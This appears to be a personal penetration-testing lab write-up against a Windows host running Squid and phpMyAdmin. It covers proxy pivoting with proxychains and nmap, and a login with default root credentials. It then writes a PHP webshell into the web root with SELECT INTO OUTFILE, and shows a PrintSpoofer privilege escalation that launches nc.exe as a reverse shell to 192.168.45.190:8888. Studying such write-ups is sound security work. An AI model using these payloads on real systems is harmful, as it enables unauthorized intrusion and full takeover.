port scanning: 
```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3128/tcp  open  http-proxy    syn-ack ttl 125 Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-time: 
|   date: 2025-12-18T06:04:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44989/tcp): CLEAN (Timeout)
|   Check 2 (port 43921/tcp): CLEAN (Timeout)
|   Check 3 (port 15240/udp): CLEAN (Timeout)
|   Check 4 (port 34171/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```


port 3128: http://192.168.178.189:3128/
![](../../Assets/Screenshot%202025-12-18%20at%202.01.56%20PM.png)

Squid version 4.14 -> search on searchsploit -> found nothing 

add this to the end of /etc/proxychains.cnf
```
http 192.168.178.189 3128
```

then do a proxychain nmap scan on the device
```
proxychains nmap -sT -n -p- localhost
```

```
PORT      STATE SERVICE
2112/tcp  open  kip
5432/tcp  open  postgresql
7474/tcp  open  neo4j
7687/tcp  open  bolt
8080/tcp  open  http-proxy
39431/tcp open  unknown
```

do a more indepth scan of the internal services 
```
proxychains nmap -sT -n -p2122,5432,7474,7687,8080,39431 -vv -Pn -sC -sV localhost
```

```
2122/tcp  closed caupc-remote conn-refused
5432/tcp  open   postgresql   syn-ack      PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
|     Fbackend_startup.c
|     L679
|_    RProcessStartupPacket
| ssl-cert: Subject: commonName=attackbox
| Subject Alternative Name: DNS:attackbox
| Issuer: commonName=attackbox
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-11T03:58:43
| Not valid after:  2035-05-09T03:58:43
| MD5:   cb7b:7e17:2a33:2ab0:e4d1:f749:4b91:2596
| SHA-1: dbd6:bb87:6cbb:8770:9f15:64bf:8b6b:82db:c718:7bd5
| -----BEGIN CERTIFICATE-----
| MIIC+DCCAeCgAwIBAgIUHKfRgmU1P61ZZj0Jw3LGGcUGm0wwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJYXR0YWNrYm94MB4XDTI1MDUxMTAzNTg0M1oXDTM1MDUw
| OTAzNTg0M1owFDESMBAGA1UEAwwJYXR0YWNrYm94MIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEArUhtsqjHYgAnQeol1/pSsUWGD4g+D30yLJwS7yijrti+
| mhwe3KZSpAOFG1fRGWzPaAqwDwkmYBtDGjUPSc1xEb2Y2x0C4y5RXJN/EBdNsXyu
| SibPcwZLSVs8UgAdQMjtUu6Tz3UWjeh1apeHkFww36R4BfWJOPraSH+lPx8bStJj
| oanfitBaeBHG37Q6j/9O3Z3Vs6WGFh1vkfjCeIAEG5/Ox+TTrMP57JHKm7nGALDx
| 9mMVIdYUju6yU0B+ox1ekQFBflmZNkZpldiqU8Eq+fS28/13KQRIWZCY+oOxOdHB
| fQ9nDU9hD04gq9LZ0unlPsTLbLtq44U6Hyb3blqlKQIDAQABo0IwQDAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCWF0dGFja2JveDAdBgNVHQ4EFgQUeHyFmN/nFxRJAr25
| vqnr7zNxbjMwDQYJKoZIhvcNAQELBQADggEBAGhnH9H39PXglxPg++mgFKSh0eYL
| G2Y6Ygtt/Ao04ZrwSGPMVhhG4kxhtUs70cVHu+ac0YF0EWV7Axd434cNJf0jtY2U
| 1IeJldAqcFNcg9Az+I5qRYLdbNfl9Lbt1DUVZEnQJjFIfHihBVFuMK8UcHy+4wzI
| tAK2wnDgZDQVF8SyZhK4tZPcNKWO8cnq7d1czyOBCar9seYfZ7Zs/TafAJSt23Mk
| 0mPTgFk1jAp8OqvMetzvP97Mu1xIdlHOYuVyr+7JoxDbSLg/fZcFq+ceRx5Q+RUD
| zoSJ7W8hMYGSwZyjzptH1uHmDG9ezPw5WdJTPiRjE2HLBzwDaXKbAKez9Ho=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
7474/tcp  open   neo4j?       syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 18 Dec 2025 06:30:34 GMT
|     Access-Control-Allow-Origin: *
|     Content-Type: application/json
|     Vary: Accept
|     Content-Length: 217
|     "bolt_routing" : "neo4j://127.0.0.1:7687",
|     "transaction" : "http://127.0.0.1:7474/db/{databaseName}/tx",
|     "bolt_direct" : "bolt://127.0.0.1:7687",
|     "neo4j_version" : "4.4.26",
|     "neo4j_edition" : "community"
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 18 Dec 2025 06:30:34 GMT
|     Access-Control-Allow-Origin: *
|     Content-Type: text/plain
|     Allow: HEAD,GET,OPTIONS
|     Content-Length: 18
|     HEAD, GET, OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
7687/tcp  open   bolt?        syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     content-type: application/json
|     access-control-allow-origin: *
|     vary: Accept
|     date: Thu, 18 Dec 2025 06:30:34 GMT
|_    content-length: 0
8080/tcp  open   http-proxy   syn-ack
| http-methods: 
|_  Supported Methods: GET OPTIONS
| http-title: BloodHound
|_Requested resource was /ui
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     Requestid: b4495baf-0d0d-4d38-845d-31bab3637f7f
|     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
|     X-Content-Type-Options: nosniff
|     Date: Thu, 18 Dec 2025 06:30:29 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, RTSPRequest, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 301 Moved Permanently
|     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:;
|     Content-Type: text/html; charset=utf-8
|     Location: /ui
|     Permissions-Policy: fullscreen=*, unsized-media=*, unoptimized-images=*, geolocation=(), camera=(), microphone=(), payment=()
|     Referrer-Policy: strict-origin-when-cross-origin
|     Requestid: 6ac0f194-7b71-467d-b079-e85e181c865e
|     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Dec 2025 06:30:29 GMT
|     Content-Length: 38
|     href="/ui">Moved Permanently</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Requestid: 55ef84af-8488-4eea-8850-9f6328dca00a
|     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
|     Date: Thu, 18 Dec 2025 06:30:29 GMT
|_    Content-Length: 0
39431/tcp open   unknown      syn-ack
....
```

curling the port 8080
```
curl --proxy http://192.168.178.189:3128 http://192.168.178.189:8080 
```
we get back a webpage using MySQL/MariaDB and links to the phpmyadmin

curl --proxy http://192.168.178.189:3128 http://192.168.178.189:8080/phpmyadmin/
version 5.0.2
![](../../Assets/Screenshot%202025-12-18%20at%202.53.55%20PM.png)

and the proxy into the foxyproxy in firefox

go to 127.0.0.1:8080

![](../../Assets/Screenshot%202025-12-18%20at%202.57.36%20PM.png)

in php info -> 
Windows NT SQUID 10.0 build 17763 (Windows Server 2016) AMD64, x64


127.0.0.1:8080/phpmyadmin -> default credentials of root and no password


![](../../Assets/Screenshot%202025-12-18%20at%203.03.58%20PM.png)


change the password of root account to `root` and then login into adminer

we know the server document root is : C:/wamp/www/

![](../../Assets/Screenshot%202025-12-18%20at%203.13.30%20PM.png)

```
SELECT "<h1>hello world<\h1>" INTO OUTFILE 'C:/wamp/www/helloworld.html';
```

![](../../Assets/Screenshot%202025-12-18%20at%203.18.25%20PM.png)

we can try injecting a php script
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/wamp/www/webshell.php';
```

![](../../Assets/Screenshot%202025-12-18%20at%203.21.04%20PM.png)


got the reverse shell after uploading the reverse shell script 

systeminfo 
![](../../Assets/Screenshot%202025-12-18%20at%203.33.13%20PM.png)

whoami /priv

![](../../Assets/Screenshot%202025-12-18%20at%203.33.45%20PM.png)


can try print spoofer

1. set up smb server using impacket-smbserver
2. copy PrintSpoofer.exe and nc.exe over
3. ```
   PrintSpoofer.exe -c "c:\wamp\www\nc.exe 192.168.45.190 8888 -e cmd"
   ```
4. set a listener on port 8888 